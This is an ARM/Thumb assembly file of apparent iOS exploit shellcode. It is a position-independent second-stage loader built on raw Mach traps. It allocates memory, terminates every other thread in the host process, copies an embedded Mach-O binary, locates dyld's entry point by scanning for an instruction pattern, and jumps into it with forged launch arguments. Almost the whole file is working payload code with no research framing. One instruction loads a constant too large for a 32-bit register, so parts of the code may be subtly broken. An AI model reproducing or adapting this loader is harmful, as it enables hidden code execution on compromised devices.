.align 4
.global _start_thumb

#define TRAP_MACH_MSG           #-31
#define TRAP_MACH_TASK_SELF     #-28
#define TRAP_MACH_REPLY_PORT    #-26
#define TRAP_THREAD_SELF        #-27
#define TRAP_MACH_VM_ALLOCATE   #-10
#define TRAP_THREAD_SWITCH      #-61
#define MSGH_BITS               0
#define MSGH_SIZE               4
#define MSGH_REMOTE_PORT        8
#define MSGH_LOCAL_PORT         12
#define MSGH_VOUCHER_PORT       16
#define MSGH_ID                 20
#define MSG_NDR                 24
#define MSG_OPT1                32
#define MSG_OPT2                36
#define MSG_ALL_IMAGE           40
#define SYS_EXIT                1
#define TASK_DYLD_INFO          17
#define TASK_DYLD_INFO_COUNT    5
#define IMAGE_LOAD_ADDR         20
#define THREAD_LIST             0x1c
#define THREAD_LIST_COUNT       0x20
#define PARAMS_BASE             0
#define PARAMS_ARGC             4
#define PARAMS_ARGV0            8
#define PARAMS_ARGV1            12
#define PARAMS_ENV0             16
#define PARAMS_APPLE0           20
#define PARAMS_APPLE1           24
#define PARAMS_STRINGS          28
#define LC_SIZE                 8
#define SC_SIZE                 56
#define MH_SIZE                 28
#define MH_NCMDS                16
#define LC_CMD                  0
#define LC_CMDSIZE              4
#define SC_FILESIZE             36
#define SC_FILEOFF              32
#define SC_VMADDR               24
#define	LC_SEGMENT              0x1

.macro mov32
    movw $0, #(($1) & 0xffff)
    movt $0, #((($1) >> 16) & 0xffff)
.endmacro

.macro movp
    movw $0, #:lower16:$1
    movt $0, #:upper16:$1
    adr r12, _start_arm
    add $0, $0, r12
.endmacro

.macro brx
    adr     r12, $0
    blx     r12
.endmacro

.thumb
_start_thumb:
    nop
    bx      pc

.arm 
_start_arm:
    // sleep for 100ms
    movs    r0, #0
    movs    r1, #2
    movs    r2, #100
    mov     r12, TRAP_THREAD_SWITCH
    svc     #0x80

    // allocate a new stack 
    brx     _mach_task_self
    mov     r1, sp
    mov     r2, #0x40000
    movs    r3, #0
    movs    r4, #1
    movs    r5, #0
    movs    r6, #1
    brx     _mach_vm_allocate

    ldr     r0, [sp, #0x0]
    cmp     r0, #0
    beq     _quit
    add     r0, r0, #0x10000
    mov     sp, r0

    // zero out thread state 
    movs    r0, #0
    mov     r1, r0
    mov     r2, r0
    mov     r3, r0
    mov     r4, r0
    mov     r5, r0
    mov     r6, r0
    mov     r7, r0
    mov     r8, r0
    mov     r9, r0
    mov     r10, r0
    mov     r11, r0
    mov     r12, r0

    // end all other threads
    brx     _terminate_unused_threads

    // allocate stack for target macho
    brx      _mach_task_self
    mov     r1, sp
    mov     r2, #0x800000
    movs    r3, #0
    movs    r4, #1
    movs    r5, #0
    movs    r6, #1
    brx     _mach_vm_allocate

    ldr     r0, [sp]
    cmp     r0, #0
    beq     _quit
    add     r11, r0, #0x80000

    // copy target macho to _start_arm page + 0x10000
    adr     r0, _start_arm
    mov     r1, #0x0fff
    mvn     r1, r1
    and     r0, r0, r1
    add     r10, r0, #0x10000

    mov     r0, r10
    adr     r2, _start_thumb
    ldr     r1, [r2, #-0x20] 
    ldr     r2, [r2, #-0x1c]
    brx     _mem_copy
    mov     r10, r0

    // get __dyld_start
    brx     _find_dyld_start
    cmp     r0, #0
    beq     _quit
    mov     r8, r0

    // set stack for __dyld_start call
    str     r10, [r11, PARAMS_BASE]
    movs    r0, #1
    str     r0, [r11, PARAMS_ARGC]
    add     r0, r11, PARAMS_STRINGS
    str     r0, [r11, PARAMS_ARGV0]
    str     r0, [r11, PARAMS_APPLE0]
    movs    r0, #0
    str     r0, [r11, PARAMS_ARGV1]
    str     r0, [r11, PARAMS_ENV0]
    str     r0, [r11, PARAMS_APPLE1]

    // setup resources info struct
    adr     r0, _start_thumb
    sub     r0, r0, #0x1c
    mov32   r12, 0x41414100
    str     r12, [r0]
    str     r0, [r11, PARAMS_STRINGS]
    
    mov     r12, r8
    mov     sp, r11
    bx      r12

    movs    r0, #0
    mov     r12, #1
    svc     #0x80
    trap


_mem_copy:
    cmp     r0, #0
    beq     1f
    cmp     r1, #0
    beq     1f
    movs    r4, #0

0:
    cmp     r2, r4
    beq     1f
    ldrb    r5, [r1, r4]
    strb    r5, [r0, r4]
    add     r4, r4, #0x1
    b       0b

1:
    bx      lr


// mach trap wrappers
_mach_task_self:
    mov     r12, TRAP_MACH_TASK_SELF
    svc     #0x80
    bx      lr


_mach_vm_allocate:
    mov     r12, TRAP_MACH_VM_ALLOCATE
    svc     #0x80
    bx      lr


_mach_reply_port:
    mov     r12, TRAP_MACH_REPLY_PORT
    svc     #0x80
    bx      lr


_thread_self:
    mov     r12, TRAP_THREAD_SELF
    svc     #0x80
    bx      lr


_mach_msg:
    movs    r5, #0
    movs    r6, #0
    mov     r12, TRAP_MACH_MSG
    svc     #0x80
    bx      lr


_terminate_thread:
    push    {r7, lr}
    mov     r7, sp
    sub     sp, #0x40

    mov     r4, r0
    brx     _thread_self
    cmp     r0, r4
    beq     0f

    str     r4, [sp, MSGH_REMOTE_PORT]
    brx     _mach_reply_port
    str     r0, [sp, MSGH_LOCAL_PORT]
    mov     r4, r0

    mov     r0, #0x1511
    str     r0, [sp, MSGH_BITS]
    movs    r0, #0x18
    str     r0, [sp, MSGH_SIZE]
    movs    r0, #0
    str     r0, [sp, MSGH_VOUCHER_PORT]
    mov     r0, #0xe10
    str     r0, [sp, MSGH_ID]

    mov     r0, sp
    movs    r1, #3
    movs    r2, #0x18
    movs    r3, #0x2c
    brx     _mach_msg

0:
    mov     r0, #0
1:
    add     sp, #0x40
    pop     {r7, pc}


_terminate_unused_threads:
    push    {r7, lr}
    mov     r7, sp
    sub     sp, #0x50

    brx     _mach_reply_port
    mov     r4, r0
    str     r0, [sp, MSGH_LOCAL_PORT]

    brx     _mach_task_self
    str     r0, [sp, MSGH_REMOTE_PORT]

    mov     r0, #0x1513
    str     r0, [sp, MSGH_BITS]
    mov     r0, #0x18
    str     r0, [sp, MSGH_SIZE]
    mov     r0, #0
    str     r0, [sp, MSGH_VOUCHER_PORT]
    mov     r0, #0xd4a
    str     r0, [sp, MSGH_ID]

    mov     r0, sp
    movs    r1, #3
    movs    r2, #0x18
    movs    r3, #0x40
    brx     _mach_msg

    ldr     r11, [sp, THREAD_LIST]
    ldr     r10, [sp, THREAD_LIST_COUNT]
    cmp     r10, #1
    ble     1f
    sub     r10, r10, #1

0:
    dsb     sy
    cmp     r10, #0
    blt     1f

    movs    r4, #4
    mul     r5, r10, r4
    ldr     r0, [r11, r5]
    sub     r10, r10, #1

    brx     _terminate_thread
    b       0b

1:
    add     sp, #0x50
    pop     {r7, pc}


_find_dyld_start:
    push    {r7, lr}
    mov     r7, sp
    sub     sp, #0x180

    brx     _mach_reply_port
    mov     r4, r0
    str     r0, [sp, MSGH_LOCAL_PORT]

    brx     _mach_task_self
    str     r0, [sp, MSGH_REMOTE_PORT]

    mov     r0, #0x1513
    str     r0, [sp, MSGH_BITS]
    mov     r0, #0x28
    str     r0, [sp, MSGH_SIZE]
    mov     r0, #0
    str     r0, [sp, MSGH_VOUCHER_PORT]
    mov     r0, #0xd4d
    str     r0, [sp, MSGH_ID]
    mov     r0, #0x100000000
    str     r0, [sp, MSG_NDR]
    mov     r0, #TASK_DYLD_INFO
    str     r0, [sp, MSG_OPT1]
    mov     r0, #TASK_DYLD_INFO_COUNT
    str     r0, [sp, MSG_OPT2]

    mov     r0, sp
    movs    r1, #3
    movs    r2, #0x28
    movs    r3, #0x13c
    brx     _mach_msg

    ldr     r4, [sp, MSG_ALL_IMAGE]
    ldr     r2, [r4, IMAGE_LOAD_ADDR]
    add     r0, r2, #0x1000

0:
    ldr     r1, [r0]
    mov32   r2, 0xe1a0800d // mov r8, sp
    cmp     r1, r2
    beq     1f
    add     r0, r0, #0x4
    b       0b

1:
    add     sp, #0x180
    pop     {r7, pc}


_quit:
    movs    r0, #0
    mov     r12, #1
    svc     #0x80
    trap

_empty_str:             .ascii "\0\0\0\0"
